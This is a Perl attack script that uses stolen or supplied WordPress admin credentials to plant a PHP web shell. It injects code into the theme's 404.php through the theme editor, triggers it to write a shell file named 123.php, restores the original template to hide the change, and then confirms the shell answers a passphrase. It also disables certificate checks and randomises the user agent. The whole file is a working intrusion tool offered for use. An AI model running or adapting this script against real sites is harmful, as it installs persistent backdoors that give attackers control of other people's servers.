#!/usr/bin/perl

use strict;
use warnings;
use utf8;
use feature 'say';
use lib '/secure/Common/src/cpan';

use FindBin;
use lib "$FindBin::Bin/lib";
use Getopt::Long;
use Data::Dumper;
use LWP::UserAgent;
use HTTP::Cookies;
use Mojo::DOM;
use W3::Random qw/random_ua random_ip/;

binmode(STDOUT, ':encoding(utf8)');

my ($dom, $resp);
my $shell  = '<?php file_put_contents("../../../123.php", base64_decode("YOUR PHP SHELL HERE")); ?>';
my $expect = '/123.php';
my $spass  = 'PASSPHRASE IF REQUIRED';

my $ua  = LWP::UserAgent->new (
    agent    => random_ua
    timeout  => 5,
    ssl_opts => { verify_hostname => 0, SSL_verify_mode => 'SSL_VERIFY_NONE' }
);
$ua->env_proxy;
$ua->cookie_jar(HTTP::Cookies->new);

#
# user supplied
#

die "Usage: $0 http://ubuntu64/wordpress username password\n" unless scalar @ARGV eq 3;

my $url = $ARGV[0];
my $usr = $ARGV[1];
my $pwd = $ARGV[2];

#
# end user supplied
# 

$resp = $ua->post ($url . '/wp-login.php', { log => $usr, pwd => $pwd });
die '[!] Unsuccessfuly login attempt' unless $resp->header ('Set-Cookie') =~ /wordpress_logged_in/;

say '[+] Logged in, replacing cookies';
$resp = $ua->get ($url . '/wp-admin');

say '[+] Now looking for editor';
$resp = $ua->get ($url . '/wp-admin/theme-editor.php?file=404.php');
$dom  = Mojo::DOM->new ($resp->content);

eval {
    my $content = $dom->find ('#newcontent')->[0]->text;
    say '[+] Editor found, old content length ', length ($content);

    my %data = (
        newcontent => $shell
    );

    $dom->find ('#template input')->each (sub {
        my $name  = $_[0]->attr ('name');
        my $value = $_[0]->attr ('value');

        $data{$name} = $value if $_[0]->attr ('type') eq 'hidden';
    });
    say '[+] Building forms';
    say '    --> ', $_, ' with value ', $data{$_} for grep { $_ ne 'newcontent' } keys %data;
        
    say '[+] Saving files';
    $resp = $ua->post ($url . '/wp-admin/theme-editor.php', \%data);
    
    say '[+] Accessing previously saved file';
    $resp = $ua->get  ($url . '/wp-content/themes/' . $data{theme} . '/404.php');

    say '[+] Restoring contents of 404.php';
    $data{newcontent} = $content;
    $resp = $ua->post ($url . '/wp-admin/theme-editor.php', \%data);

    say '[+] Checking if shell is in place';
    $resp = $ua->post ($url . $expect, { $spass => 'die(base64_decode("YzBkZWJyZWFr"))' });
    if ($resp->content =~ /c0debreak/)
    {
        say '[+] PHP shell ready';
        say '    URL:  ', $url . $expect;
        say '    Pass: ', $spass;
    }
    else
    {
        say '[!] GetShell procedure not working, sigh';
    }
};

if ($@)
{
    say '!! Unexpected error: ', $@;
}
